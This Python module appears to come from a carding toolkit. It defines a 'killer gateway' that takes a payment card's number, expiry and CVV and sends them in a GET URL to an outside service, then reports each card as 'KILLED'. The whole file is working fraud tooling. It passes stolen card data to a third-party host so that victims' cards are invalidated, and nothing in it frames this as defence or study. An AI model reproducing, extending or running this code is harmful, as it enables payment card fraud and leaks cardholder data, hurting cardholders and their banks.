"""
Killer Gateway - Card Killer (Not Checker)
API: https://killbydiwas.onrender.com/gateway=trialkd
"""
import aiohttp
import asyncio
import json
from typing import Dict

async def killer_check(cc: str, mm: str, yy: str, cvv: str) -> Dict:
    """
    Killer gateway - This kills cards, not checks them
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
    
    Returns:
        dict: {'status': str, 'response': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint
    api_url = f"https://killbydiwas.onrender.com/gateway=trialkd/cc={full_card}"
    
    try:
        timeout = aiohttp.ClientTimeout(total=180)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                api_url,
                headers={"User-Agent": "Mozilla/5.0"}
            ) as resp:
                if resp.status != 200:
                    return {
                        'status': 'Error',
                        'response': f'API returned HTTP {resp.status}'
                    }
                
                api_response = await resp.text()
                
                # Parse response
                try:
                    data = json.loads(api_response)
                except:
                    data = {'response': api_response}
                
                response = data.get('response') or data.get('Response') or data.get('msg') or api_response
                
                # This is a killer gateway, so status is always "KILLED"
                return {
                    'status': 'KILLED',
                    'response': f'Card has been killed: {response[:100]}'
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Error',
            'response': 'Request timed out'
        }
    except Exception as e:
        return {
            'status': 'Error',
            'response': f'Connection error: {str(e)[:100]}'
        }
